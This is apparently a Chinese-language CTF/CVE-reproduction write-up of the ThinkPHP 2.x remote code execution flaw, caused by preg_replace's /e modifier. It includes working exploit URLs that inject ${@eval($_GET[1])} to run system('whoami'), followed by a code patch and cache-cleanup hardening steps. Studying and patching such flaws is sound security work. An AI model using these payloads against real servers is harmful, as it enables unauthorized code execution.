---
title: Thinkphp 2-rce
date: '2026-10-22 22:40:38'
tags: []
categories:
  - CTF-Writeups
  - CVE复现
slug: Thinkphp 2-rce
permalink: /thinkphp-2-rce
draft: false
---

## 1、漏洞描述
- **影响版本**：ThinkPHP 2.0 / 2.1（2.x 系列，使用 PHP 5.5 及以下版本时受影响）
- **漏洞类型**：远程代码执行（RCE）
- **成因类别**：`preg_replace` 的 `/e` 修饰符导致的代码注入
- **触发点**：框架路由解析（Dispatcher）对 URL 参数的处理
- **利用条件**：无需认证，攻击者直接构造 URL 即可利用；依赖 PHP < 7.0（`/e` 修饰符在 PHP 7 中被移除）
## 2、漏洞成因

ThinkPHP 2.x 在路由分发时，会把 URL 中的路径按分隔符拆开，解析成"模块 / 控制器 / 操作"以及附加的 `key/value` 参数对。解析这段逻辑的核心代码大致如下：
```php
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e',
                    '$var[\'\\1\']="\\2";',
                    implode($depr, $paths));
```
关键问题在于正则修饰符 **`/e`**。`/e`（PREG_REPLACE_EVAL）会让 `preg_replace` 在完成替换后，把替换结果字符串**当作 PHP 代码再次执行**。
- 正则匹配的是 `参数名/参数值` 这种形式（例如 `name/value`）。
- 替换字符串 `'$var[\'\\1\']="\\2";'` 中，`\1` 是参数名，`\2` 是参数值。
- 由于替换结果要作为代码执行，而**参数值 `\2` 直接拼进了双引号字符串里**，如果参数值中包含 `${...}` 形式，PHP 在解析双引号字符串时会对其中的 `${}` 进行**变量/表达式求值**——这里就执行了攻击者控制的代码。
## 3、复现

![](/images/20261022224040.png)

ThinkPHP 2.x 的典型访问格式是 `index.php/模块/控制器/操作/参数名/参数值`，或者用兼容模式 `index.php?s=/模块/控制器/操作/参数名/参数值`。
比如：
```
/index.php?s=/index/index/name/${@phpinfo()} # 这个payload拒绝空格和/
/index.php?s=/index/index/name/${@eval($_GET[1])}&1=system('whoami');
```
都可以触发RCE

## 4、安全加固
**先备份**
```
# 进入框架核心目录（根据你的实际路径调整）
cd /var/www/html/ThinkPHP/Lib/Think/Util/
# 备份原始文件
cp Dispatcher.class.php Dispatcher.class.php.bak
```
**修改关键代码**
用 `vim` 或 `sed` 找到约 102 行附近的那条 `preg_replace` 语句。原始代码大致是：
```php
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```
需要做的修改是：**把替换模板中 `\\2` 外面的双引号改为单引号**。修改后应为：
```php
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']=\'\\2\';', implode($depr,$paths));
```
这个改动的原理是：单引号字符串中的 `${...}` 不会被 PHP 解析求值，从而阻断代码执行。用 `sed` 快速操作的话:
```php
sed -i "s/\\\$var\['\\\\1'\]=\"\\\\2\";/\\\$var['\\\\1']='\\\\2';/" Dispatcher.class.php
```
**清理编译缓存**
```bash
cd /var/www/html/
rm -f Runtime/Temp/*.php
rm -rf Runtime/Temp/thinkphp/
rm -f Runtime/Data/*.php
rm -f Runtime/Data/route.php
rm -f Runtime/Data/config.php
```
